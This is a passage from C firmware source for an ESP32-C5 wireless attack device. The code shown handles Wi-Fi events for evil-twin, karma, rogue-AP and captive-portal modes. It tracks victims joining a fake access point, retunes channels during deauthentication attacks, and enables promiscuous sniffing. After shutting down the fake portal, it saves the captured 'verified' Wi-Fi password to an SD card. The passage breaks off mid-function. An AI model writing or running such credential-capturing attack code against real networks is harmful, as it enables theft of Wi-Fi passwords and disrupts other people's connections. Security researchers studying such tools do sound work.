brokali/projectZeroTouch/ESP32C5/main/main.c
                // Stop HTTP server
                if (portal_server != NULL) {
                    httpd_stop(portal_server);
                    portal_server = NULL;
                    MY_LOG_INFO(TAG, "HTTP server stopped.");
                }
                
                // Stop DHCP server
                esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
                if (ap_netif) {
                    esp_netif_dhcps_stop(ap_netif);
                }
                
                // Change WiFi mode from APSTA to STA only (disable AP)
                esp_err_t mode_ret = esp_wifi_set_mode(WIFI_MODE_STA);
                if (mode_ret == ESP_OK) {
                    MY_LOG_INFO(TAG, "WiFi mode changed to STA only - AP disabled.");
                } else {
                    MY_LOG_INFO(TAG, "Failed to change WiFi mode: %s", esp_err_to_name(mode_ret));
                }
                
                MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
                
                // Small delay to ensure all resources are properly released
                vTaskDelay(pdMS_TO_TICKS(500));
                
                // Now save verified password to SD card (after portal is fully closed)
                if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
                    MY_LOG_INFO(TAG, "Saving verified password to SD card...");
                    save_evil_twin_password(evilTwinSSID, evilTwinPassword);
                }
            }
            
            applicationState = IDLE;
            break;
        }
        case WIFI_EVENT_AP_STACONNECTED: {
            const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
            MY_LOG_INFO(TAG, "AP: Client connected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);

            if (capture_gateway_is_active()) {
                capture_gateway_client_connected();
                capture_gateway_status_t status;
                capture_gateway_get_status(&status);
                MY_LOG_INFO(TAG, "Capture Gateway: client joined, clients=%u", status.connected_clients);
                break;
            }
            
            // Increment connected clients counter
            portal_connected_clients++;
            MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
            
            // OLED update for portal/karma/rogueap client connect (not evil twin - that's handled in deauth task)
            if (portal_active && !evilTwinSSID) {
                const char *mode_name = karma_mode_active ? "> Karma Attack" :
                                        rogueap_mode_active ? "> Rogue AP" : "> Captive Portal";
                char p_l4[64];
                snprintf(p_l4, sizeof(p_l4), "  Clients: %d", portal_connected_clients);
                oled_display_update_full(mode_name, portalSSID ? portalSSID : "", "  Client joined!", p_l4);
            }
            
            // During evil twin attack, switch to first selected network's channel
            if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) && 
                g_selected_count > 0 && target_bssid_count > 0) {
                int idx = g_selected_indices[0];
                uint8_t target_channel = target_bssids[0].channel; // Use first target_bssid (corresponds to first selected network)
                MY_LOG_INFO(TAG, "Client connected to portal - switching to channel %d (first selected network: %s)", 
                           target_channel, g_scan_results[idx].ssid);
                esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            }
            
            // Wait a bit for DHCP to assign IP
            vTaskDelay(pdMS_TO_TICKS(3000));
            break;
        }
        case WIFI_EVENT_AP_STADISCONNECTED: {
            const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X, AID: %u, reason: %u",
                        e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid, e->reason);

            if (capture_gateway_is_active()) {
                capture_gateway_client_disconnected();
                capture_gateway_status_t status;
                capture_gateway_get_status(&status);
                MY_LOG_INFO(TAG, "Capture Gateway: client left, clients=%u", status.connected_clients);
                break;
            }
            
            // Decrement connected clients counter
            if (portal_connected_clients > 0) {
                portal_connected_clients--;
            }            
            // If last client disconnected during evil twin attack, resume channel hopping
            if (portal_connected_clients == 0 && 
                (applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK)) {
                MY_LOG_INFO(TAG, "Last client disconnected - resuming channel hopping for deauth");
            }
            break;
        }
        case WIFI_EVENT_SCAN_DONE: {
            const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
            bool suppress_scan_logs = periodic_rescan_in_progress || wardrive_active || channel_view_scan_mode || g_scan_teardown_in_progress;

            if (!suppress_scan_logs) {
                MY_LOG_INFO(TAG, "WiFi scan completed. Found %u networks, status: %" PRIu32, e->number, e->status);
            }

            g_last_scan_status = e->status;
            if (e->status == 0) { // Success
                g_scan_count = MAX_AP_CNT;
                esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results);
                
                if (!suppress_scan_logs) {
                    if (g_scan_start_time_us > 0) {
                        int64_t elapsed_us = esp_timer_get_time() - g_scan_start_time_us;
                        float elapsed_s = elapsed_us / 1000000.0f;
                        MY_LOG_INFO(TAG, "Retrieved %u network records in %.1fs", g_scan_count, elapsed_s);
                    } else {
                        MY_LOG_INFO(TAG, "Retrieved %u network records", g_scan_count);
                    }
                    
                    // Automatically display scan results after completion
                    if (g_scan_count > 0 && !sniffer_active) {
                        print_scan_results();
                    }
                }
            } else {
                if (!suppress_scan_logs) {
                    MY_LOG_INFO(TAG, "Scan failed with status: %" PRIu32, e->status);
                }
                g_scan_count = 0;
            }
            
            g_scan_done = true;
            g_scan_in_progress = false;
            g_scan_teardown_in_progress = false;

            // Update OLED with scan results (only if not suppressed / in sniffer)
            if (!suppress_scan_logs && !sniffer_active) {
                char oled_l2[32];
                snprintf(oled_l2, sizeof(oled_l2), "  Found %u APs", g_scan_count);
                char oled_l3[32];
                if (g_scan_start_time_us > 0) {
                    int64_t elapsed_us = esp_timer_get_time() - g_scan_start_time_us;
                    float elapsed_s = elapsed_us / 1000000.0f;
                    snprintf(oled_l3, sizeof(oled_l3), "  %.1fs elapsed", elapsed_s);
                } else {
                    oled_l3[0] = '\0';
                }
                oled_display_update_full("> Scan Complete", oled_l2, oled_l3, "  > select next");
            }
            
            // Only reset applicationState to IDLE if not in active attack mode
            if (applicationState != DEAUTH && applicationState != DEAUTH_EVIL_TWIN && applicationState != EVIL_TWIN_PASS_CHECK) {
                applicationState = IDLE;
            }
            
            // Handle sniffer transition from scan to promiscuous mode
            if (sniffer_active && sniffer_scan_phase) {
                sniffer_process_scan_results();
                sniffer_scan_phase = false;
                
                // Set promiscuous filter (like Marauder)
                esp_wifi_set_promiscuous_filter(&sniffer_filter);
                
                // Enable promiscuous mode
                esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
                esp_wifi_set_promiscuous(true);
                
                // Initialize dual-band channel hopping
                sniffer_channel_index = 0;
                sniffer_current_channel = dual_band_channels[sniffer_channel_index];
                sniffer_last_channel_hop = esp_timer_get_time() / 1000;
                esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
                
